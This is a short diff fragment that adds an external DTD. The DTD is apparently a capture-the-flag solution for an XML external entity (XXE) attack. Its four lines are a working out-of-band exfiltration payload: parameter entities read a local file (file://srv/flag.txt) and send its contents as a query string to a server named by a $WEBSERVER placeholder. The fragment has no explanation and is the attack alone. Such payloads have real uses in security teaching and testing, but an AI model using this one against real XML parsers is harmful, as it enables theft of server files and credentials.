@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file://srv/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '$WEBSERVER/?x=%file;'>">
+%eval;
+%exfiltrate;
